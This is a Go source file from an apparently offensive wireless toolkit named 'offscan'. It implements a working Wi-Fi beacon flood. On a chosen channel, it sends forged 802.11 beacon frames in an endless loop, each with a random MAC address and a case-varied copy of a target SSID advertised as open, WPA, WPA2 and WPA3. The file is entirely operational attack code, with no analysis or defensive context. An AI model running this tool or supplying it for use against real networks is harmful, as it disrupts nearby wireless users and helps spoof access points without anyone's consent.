/*
 * Copyright (C) 2025 Oliver R. Calazans Jeronimo
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org>.
 */

package beacon

import (
	"fmt"
	"net"
	"time"

	"offscan/internal/frame80211"
	"offscan/internal/generators"
	"offscan/internal/ifconfig"
	"offscan/internal/sockets"
	"offscan/internal/utils"
)



func Run(args []string) {
    newBeaconFlooder(args).execute()
}



type beaconFlood struct {
    channel uint8
    ssid    string
    bcSent  int
    builder *frame80211.Beacon
    socket  *sockets.Layer2Socket
}



func newBeaconFlooder(argList []string) *beaconFlood {
	bcArgs := parseArgs(argList)

    ifconfig.MustSetChannel(bcArgs.Iface, bcArgs.Channel)

    return &beaconFlood{
        channel: uint8(bcArgs.Channel),
        ssid:    bcArgs.Ssid,
        bcSent:  0,
        builder: frame80211.NewBeacon(),
        socket:  sockets.NewL2Socket(bcArgs.Iface),
    }
}



func (b *beaconFlood) execute() {
    ctx     := utils.SignalContext()
    randGen := generators.NewRandomValues()
    start   := time.Now()
    
	fmt.Println("[+] Sending beacons. Press Ctrl+C to stop")

    for {
        select {
        case <-ctx.Done():
            elapsed := time.Since(start).Seconds()
            fmt.Printf("\n[-] Flood interrupted\n")
            fmt.Printf("[%%] %d beacons sent in %.2f seconds\n", b.bcSent, elapsed)
            return

        default:
            bssid := randGen.RandomMac()
            ssid  := randGen.RandomCaseInversion(b.ssid)
            seq   := randGen.RandomSeq()
            b.sendQuartet(bssid, ssid, seq)
        }
    }
}



func (b *beaconFlood) sendQuartet(bssid net.HardwareAddr, ssid string, seq uint16) {
    b.sendBeacon(bssid, ssid, seq, "open")
    b.sendBeacon(bssid, ssid, seq+1, "wpa")
    b.sendBeacon(bssid, ssid, seq+2, "wpa2")
    b.sendBeacon(bssid, ssid, seq+3, "wpa3")
}



func (b *beaconFlood) sendBeacon(bssid net.HardwareAddr, ssid string, seq uint16, sec string) {
    beacon := b.builder.Beacon(bssid, ssid, seq, b.channel, sec)
    b.socket.Send(beacon)
    b.bcSent++
}